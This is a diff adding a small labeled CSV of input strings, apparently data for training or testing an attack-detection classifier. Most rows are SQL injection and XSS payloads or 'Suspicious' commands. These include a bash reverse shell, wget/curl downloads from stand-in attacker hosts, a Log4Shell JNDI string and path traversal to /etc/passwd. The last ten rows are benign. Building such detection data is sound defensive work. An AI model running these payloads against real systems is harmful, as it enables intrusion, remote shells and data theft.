@@ -1,0 +1,41 @@
+﻿payload,label
+"' OR 1=1 --",SQLi
+"admin' --",SQLi
+"' UNION SELECT username,password FROM users --",SQLi
+"' OR 'a'='a",SQLi
+"1; DROP TABLE users; --",SQLi
+"' OR 1=1#",SQLi
+"') OR ('1'='1",SQLi
+"' UNION SELECT null,null --",SQLi
+"' AND SLEEP(5) --",SQLi
+"' OR EXISTS(SELECT * FROM users) --",SQLi
+"<script>alert('xss')</script>",XSS
+"<img src=x onerror=alert(1)>",XSS
+"<svg onload=alert('xss')>",XSS
+"<body onload=alert('boom')>",XSS
+"<iframe src='javascript:alert(1)'></iframe>",XSS
+"<a href='javascript:alert(1)'>Click</a>",XSS
+"<input value='"" onfocus=alert(1) autofocus>",XSS
+"<div onclick=alert('x')>test</div>",XSS
+"<script>document.location='http://evil.test'</script>",XSS
+"<math><mtext></mtext><script>alert(9)</script></math>",XSS
+"../../../../etc/passwd",Suspicious
+"cmd.exe /c whoami",Suspicious
+"powershell -enc Z2V0LXByb2Nlc3M=",Suspicious
+"${jndi:ldap://evil.test/a}",Suspicious
+"..\\..\\windows\\system32",Suspicious
+"wget http://malicious.test/shell.sh",Suspicious
+"curl http://attacker.test/payload",Suspicious
+"nmap -sV 10.0.0.1",Suspicious
+"chmod 777 /tmp/backdoor",Suspicious
+"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",Suspicious
+"search products",Normal
+"view profile page",Normal
+"contact support form",Normal
+"GET /api/health",Normal
+"reset password request",Normal
+"update user settings",Normal
+"hello world",Normal
+"list monthly reports",Normal
+"select preferred language",Normal
+"download invoice pdf",Normal
